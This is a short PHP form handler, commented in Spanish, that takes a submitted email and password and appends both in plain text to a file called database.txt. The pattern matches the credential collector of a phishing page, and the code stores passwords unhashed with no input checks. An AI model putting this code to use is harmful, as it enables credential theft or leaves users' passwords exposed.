<?php
// Obtener los datos del formulario
$correo = $_POST['correo']; // Suponiendo que el campo de correo se llama 'correo'
$clave = $_POST['clave']; // Suponiendo que el campo de clave se llama 'clave'

// Concatenar los contenidos en una variable
$datos_a_guardar = "Correo: " . $correo . ", Clave: " . $clave;

// Abrir el archivo en modo escritura
$file = fopen("database.txt", "a"); // Usamos "a" para añadir al archivo en lugar de sobrescribirlo

// Escribir en el archivo
fwrite($file, $datos_a_guardar . PHP_EOL);

// Cerrar el archivo
fclose($file);
?>
